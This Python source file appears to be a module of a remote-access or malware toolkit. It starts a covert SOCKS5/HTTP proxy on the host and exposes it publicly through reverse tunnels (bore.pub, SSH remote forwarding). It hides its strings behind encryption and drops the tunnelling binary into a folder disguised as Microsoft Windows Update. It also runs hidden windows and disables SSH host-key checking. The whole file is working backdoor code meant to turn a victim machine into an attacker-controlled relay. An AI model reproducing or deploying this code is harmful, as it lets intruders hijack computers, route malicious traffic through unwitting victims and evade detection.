import os
import re
import shutil
import socket
import subprocess
import threading
import time
from typing import Optional
from core.obfuscation import decrypt_string

class ProxyModule:
    decrypt_string("PX07IB1kdioOIzoYIksJAhcIWAkhIzxMPw8PGFpfFBUDEgwEIT0qTXNXBUpSajUyQ0YNBSA0NUI7BEpeE1UKGA9RE0U=")
    _SSH_PATHS = [
        decrypt_string("LQgkPCc/PQ0tBDZrC0oSHwMBSjcBITwMCSQiZAFKDlQLSh0="),
        decrypt_string("LQgkPCc/PQ0tBDZrC0oxNTkETDcBITwMCSQiZAFKDlQLSh0="),
    ]
    _TUNNEL_SERVICES = [
        {"host": decrypt_string("HVcKHSs+dww/Aw=="),    "user": None,    "port_pattern": decrypt_string("Rm4cEHp9bB9z")},
        {"host": decrypt_string("Al0bCiI5NhEuWRhNHA=="), "user": "nokey", "port_pattern": decrypt_string("Rm4cEHp9bB9z")},
    ]

    def __init__(self):
        self.proxy_active = False
        self._bore_process: Optional[subprocess.Popen] = None
        self._ssh_process:  Optional[subprocess.Popen] = None
        self._server_thread: Optional[threading.Thread] = None
        self._tunnel_url: Optional[str] = None
        self._bore_tmp: Optional[str] = None
        self._bore_output: str = ""  

    def start(self, local_port: int = 4444) -> str:
        if self.proxy_active:
            return "[!] Proxy already running"
        try:
            bore_exe = self._find_bore()
            if bore_exe:
                return self._start_with_bore(bore_exe, local_port)
            
            ssh_exe = self._find_ssh()
            if not ssh_exe:
                return decrypt_string("NRMlSyw+Kwd0EhJdUlcJDk5UFx4gNXkDNBNKayFxRg8AUw4KJz04ADYS")

            self.proxy_active = True
            self._server_thread = threading.Thread(
                target=self._socks5_server, args=(local_port,), daemon=True
            )
            self._server_thread.start()
            time.sleep(0.3)

            for svc in self._TUNNEL_SERVICES:
                result = self._try_service(ssh_exe, svc, local_port)
                if result:
                    host = svc["host"]
                    self._tunnel_url = decrypt_string("FVoXGDosYxkoEhlNHk0b")
                    return (
                        decrypt_string("IXlCSx0eGikJQkpLBlgUDgtWWEM1OTYRLgpDZBxlCA==") +
                        decrypt_string("L1YcGSsiKlh6FxFQHUoSB1RJCg49JDUWJxc2Vi5X") +
                        decrypt_string("LEAXHD00K0IJEh5MG1cBCVRuFg==") +
                        decrypt_string("OksIDnRxCi0ZPDkNLlcuFR1GQks1OTYRLgo2ViJWFA5UEgMZKyIsDi4K")
                    )
                if self._ssh_process:
                    try: self._ssh_process.kill()
                    except: pass
                    self._ssh_process = None
            
            self.stop()
            return decrypt_string("NRMlSxo4NAc1Ah4CUncJWhpHFgUrPXkRPwUcURFcRggLQQgEIDU8Bg==")
        except Exception as e:
            self.stop()
            return decrypt_string("NRMlSx4jNhojVy9KAFYUQE5JHRY=")

    def stop(self) -> str:
        self.proxy_active = False
        self._tunnel_url = None
        for proc in (self._bore_process, self._ssh_process):
            if proc:
                try: proc.kill()
                except: pass
        self._bore_process = None
        self._ssh_process = None
        if self._bore_tmp and os.path.exists(self._bore_tmp):
            try: os.remove(self._bore_tmp)
            except: pass
            self._bore_tmp = None
        try:
            subprocess.run(
                ["taskkill", "/F", "/IM", decrypt_string("DF0KDmA0IQc=")],
                capture_output=True,
                creationflags=0x08000000, # CREATE_NO_WINDOW
            )
        except: pass
        return "[!] Proxy stopped"

    def _find_bore(self) -> Optional[str]:
        base = os.path.dirname(os.path.abspath(__file__))
        root = os.path.dirname(base)  
        candidates = [
            os.path.join(root, "tools", decrypt_string("DF0KDmA0IQc=")),
            os.path.join(base, decrypt_string("DF0KDmA0IQc=")),
            os.path.join(root, decrypt_string("DF0KDmA0IQc=")),
        ]
        for p in candidates:
            if os.path.exists(p): return p
        return None

    def _start_with_bore(self, bore_src: str, local_port: int) -> str:
        import uuid
        local = os.environ.get("LOCALAPPDATA", os.environ.get("TEMP", ""))
        bore_dir = os.path.join(local, "Microsoft", "Windows", "Update")
        os.makedirs(bore_dir, exist_ok=True)
        rand_name = decrypt_string("OWc8IyEiLU8hAh9RFhcTDwdWTENnfzEHIixQDi8XEwoeVwpDZyx3ByIS")
        bore_tmp = os.path.join(bore_dir, rand_name)
        try:
            shutil.copy2(bore_src, bore_tmp)
        except OSError as e:
            if getattr(e, 'winerror', None) == 225:
                return decrypt_string("NRMlSwo0Pwc0Ew9KUlsKFQ1ZHQ9uNzAOP1lKeRZdRh8WURQePTg2DHoRBUpIGQ==") + bore_dir
            return decrypt_string("NRMlSw0+KRt6EhhKHUtcWhVXBQ==")
        
        self._bore_tmp = bore_tmp
        self.proxy_active = True
        
        self._bore_process = subprocess.Popen(
            [bore_tmp, "local", str(local_port), "--to", decrypt_string("DF0KDmAhLAA=")],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,  
            text=True, encoding="utf-8", errors="replace",
            creationflags=0x08000000, # CREATE_NO_WINDOW
        )

        if not (self._server_thread and self._server_thread.is_alive()):
            self._server_thread = threading.Thread(
                target=self._socks5_server, args=(local_port,), daemon=True
            )
            self._server_thread.start()

        public_port = self._wait_for_port(decrypt_string("DF0KDhJ/KRc4TUJkFhJP"), timeout=15)
        if public_port:
            self._tunnel_url = decrypt_string("DF0KDmAhLABgDBpNEFUPGTFCFxk6LA==")
            return (
                decrypt_string("jK79Sx0eGikJQkrozejmqtDiwrrPgeFCisC6iKKGt/m/u6jenux4PjQrBA==") +
                decrypt_string("nq30+26BybLupurox+jnQE5SGgQ8NHcSLxVQQwJMBBYHUScbISMtHzorBGQc") +
                decrypt_string("nq3r2m6By0KKx7qFo7u2wr6GqN6f04nXis27ulLp16vu4si6zYHusu+m6ujHAzoU") +
                decrypt_string("jLLaS57zidqKyFAYIXYlMT0HJAU=") +
                decrypt_string("jLLaSwY+KhZgVwhXAFxIChtQJAU=") +
                decrypt_string("jLLaSx4+KxZgVxFIB1sKEw1tCAQ8JSQ=")
            )
        
        diag = self._bore_output[:400].strip()
        self.stop()
        return decrypt_string("NRMlSyw+Kwd6EhhKHUtIWiFHDBs7JWM+NBcRXBtYAQcO") if diag else decrypt_string("NRMlSxo4NAc1Ah4CUlsJCAsSHAIqcTcNLlcYXQFJCRQKHA==")

    def _find_ssh(self) -> Optional[str]:
        for path in self._SSH_PATHS:
            if os.path.exists(path): return path
        found = shutil.which("ssh")
        return found

    def _try_service(self, ssh_exe: str, svc: dict, local_port: int) -> Optional[str]:
        remote = f"nokey@{svc['host']}" if svc["user"] else svc["host"]
        cmd = [
            ssh_exe, "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=20",
            "-o", "ServerAliveCountMax=3", "-o", "ExitOnForwardFailure=yes",
            "-o", "ConnectTimeout=10", "-o", "LogLevel=ERROR",
            "-R", decrypt_string("XggUBC0wNQo1BB4CCVUJGQ9eJxshIy0f"), remote,
        ]
        self._ssh_process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, encoding="utf-8", errors="replace",
            creationflags=0x08000000, # CREATE_NO_WINDOW
        )
        return self._wait_for_port(svc["port_pattern"], timeout=15)

    def _wait_for_port(self, pattern: str, timeout: float = 15) -> Optional[str]:
        self._bore_output = ""
        result = [None]
        def reader():
            proc = self._bore_process or self._ssh_process
            if not proc: return
            try:
                while proc.poll() is None:
                    line = proc.stdout.readline()
                    if not line: break
                    self._bore_output += line
                    if result[0] is None:
                        m = re.search(pattern, line, re.IGNORECASE)
                        if m: result[0] = m.group(1)
            except: pass
        t = threading.Thread(target=reader, daemon=True)
        t.start()
        start = time.time()
        while time.time() - start < timeout:
            if result[0]: break
            proc = self._bore_process or self._ssh_process
            if proc and proc.poll() is not None: break
            time.sleep(0.3)
        return result[0]

    def _log(self, msg: str):
        try:
            print(f"[Proxy] {msg}")
            log_path = os.path.join(os.environ.get("TEMP", "."), decrypt_string("HkAXEzcOPQc4Ag0WHlYB"))
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(decrypt_string("FUYRBit/KhYoER5RH1xOXUt6Qk4Da3wxfV4XGA4ZHRcdVQU3IA=="))
        except: pass

    def _recv_exactly(self, conn: socket.socket, n: int) -> Optional[bytes]:
        data = b""
        while len(data) < n:
            try:
                packet = conn.recv(n - len(data))
                if not packet: return None
                data += packet
            except: return None
        return data

    def _socks5_server(self, port: int):
        self._log(f"Starting server on {port}")
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try: srv.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            except: pass
            srv.bind((decrypt_string("XhxIRX5/aQ=="), port))
            srv.listen(128)
            srv.settimeout(1.0)
            while self.proxy_active:
                try:
                    client, addr = srv.accept()
                    threading.Thread(
                        target=self._handle_client, args=(client,), daemon=True
                    ).start()
                except socket.timeout:
                    continue
                except Exception as e:
                    self._log(decrypt_string("PVcKHSsjeQcoBQVKSBkdHxM="))
                    break
            srv.close()
        except Exception as e:
            self._log(decrypt_string("PVcKHSsjeQAzGQ4YF0sUFRwIWBArLA=="))

    def _handle_client(self, conn: socket.socket):
        try:
            conn.settimeout(30)
            try: conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except: pass
            first = conn.recv(1, socket.MSG_PEEK)
            if not first:
                conn.close()
                return
            if first == decrypt_string("MkpIXg==").encode():
                self._handle_socks5(conn)
            else:
                self._handle_http(conn)
        except Exception as e:
            if not isinstance(e, (socket.timeout, ConnectionResetError, OSError)):
                self._log(decrypt_string("LV4RDiAleQcoBQVKSBkdHxM="))
            try: conn.close()
            except: pass

    def _handle_socks5(self, conn: socket.socket):
        try:
            header = self._recv_exactly(conn, 2)
            if not header or header[0] != 0x05:
                conn.close()
                return
            nmethods = header[1]
            methods = self._recv_exactly(conn, nmethods)
            if not methods: return
            conn.sendall(decrypt_string("MkpIXhIpaVI=").encode()) 

            req = self._recv_exactly(conn, 4)
            if not req: return
            cmd, atyp = req[1], req[3]
            
            if cmd != 0x01: 
                conn.sendall(decrypt_string("MkpIXhIpaVUGD1oILkFWSzJKSFsSKWlSBg9aCC5BVkoySkhbEilpUg==").encode())
                conn.close()
                return

            if atyp == 0x01: # IPv4
                addr = self._recv_exactly(conn, 4)
                if not addr: return
                host = socket.inet_ntoa(addr)
            elif atyp == 0x03: # Domain
                len_b = self._recv_exactly(conn, 1)
                if not len_b: return
                host_b = self._recv_exactly(conn, len_b[0])
                if not host_b: return
                host = host_b.decode("utf-8", errors="replace")
            else:
                conn.sendall(decrypt_string("MkpIXhIpaVoGD1oILkFWSzJKSFsSKWlSBg9aCC5BVkoySkhbEilpUg==").encode())
                conn.close()
                return
                
            port_b = self._recv_exactly(conn, 2)
            if not port_b: return
            dst_port = (port_b[0] << 8) | port_b[1]
            
            self._log(decrypt_string("PX07IB1kY0IhHwVLBkRcAQpBDDQ+PisWJw=="))
            try:
                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote.settimeout(30)
                try: remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except: pass
                remote.connect((host, dst_port))
                
                conn.sendall(decrypt_string("MkpIXhIpaVIGD1oILkFWSzJKSFsSKWlSBg9aCC5BVkoySkhbEilpUg==").encode())
                self._pipe(conn, remote)
            except Exception as e:
                self._log(decrypt_string("KFMRB24qMQ0pAxcCUkIDBw=="))
                conn.sendall(decrypt_string("MkpIXhIpaVMGD1oILkFWSzJKSFsSKWlSBg9aCC5BVkoySkhbEilpUg==").encode())
                conn.close()
        except Exception as e:
            if not isinstance(e, (socket.timeout, ConnectionResetError, OSError)):
                self._log(decrypt_string("PX07IB1keScIJVAYCVwb"))
            try: conn.close()
            except: pass

    def _handle_http(self, conn: socket.socket):
        try:
            data = conn.recv(16384)
            if not data: return
            try:
                header_text = data.split(decrypt_string("MkAkBRIjBQw=").encode(), 1)[0].decode("utf-8", errors="replace")
                first_line = header_text.split(decrypt_string("MkAkBQ=="))[0]
                parts = first_line.split(" ")
                if len(parts) < 2: return
                method, target = parts[0], parts[1]
            except: return
            
            if method == "CONNECT":
                host, port_s = target.rsplit(":", 1) if ":" in target else (target, "443")
                self._log(decrypt_string("JmYsO3RxIhY7BQ1dBkQ="))
                try:
                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    remote.settimeout(30)
                    try: remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    except: pass
                    remote.connect((host, int(port_s)))
                    conn.sendall(decrypt_string("JmYsO2Fgd1N6RVoIUnoJFABXGx8nPjdCHwQeWRBVDwkGVxw3PA03PigrBA==").encode())
                    self._pipe(conn, remote)
                except Exception as e:
                    self._log(decrypt_string("JmYsO243OAs2TUpDF0Q="))
                    conn.sendall(decrypt_string("JmYsO2Fgd1N6QloKUnsHHk51GR8rJjgbBgU2Vi5LOhQ=").encode())
                    conn.close()
            else:
                self._log(decrypt_string("JmYsO3RxIg8/AwJXFkRGARpTCgwrJSQ="))
                url = target[7:] if target.startswith(decrypt_string("BkYMG3R+dg==")) else target
                host_part = url.split("/")[0]
                host = host_part.split(":")[0]
                p = int(host_part.split(":")[1]) if ":" in host_part else 80
                try:
                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    remote.settimeout(30)
                    remote.connect((host, p))
                    remote.sendall(data)
                    self._pipe(conn, remote)
                except Exception as e:
                    self._log(decrypt_string("JmYsO24VMBA/FB4YFFgPFlQSAw4z"))
                    conn.close()
        except Exception as e:
            if not isinstance(e, (socket.timeout, ConnectionResetError, OSError)):
                self._log(decrypt_string("JmYsO24UCzBgVxFdDw=="))
            try: conn.close()
            except: pass

    def _pipe(self, a: socket.socket, b: socket.socket):
        a.settimeout(None)
        b.settimeout(None)
        def fwd(src, dst):
            try:
                while True:
                    d = src.recv(32768)
                    if not d: break
                    dst.sendall(d)
            except: pass
            finally:
                try: src.close()
                except: pass
                try: dst.close()
                except: pass
        threading.Thread(target=fwd, args=(a, b), daemon=True).start()
        threading.Thread(target=fwd, args=(b, a), daemon=True).start()
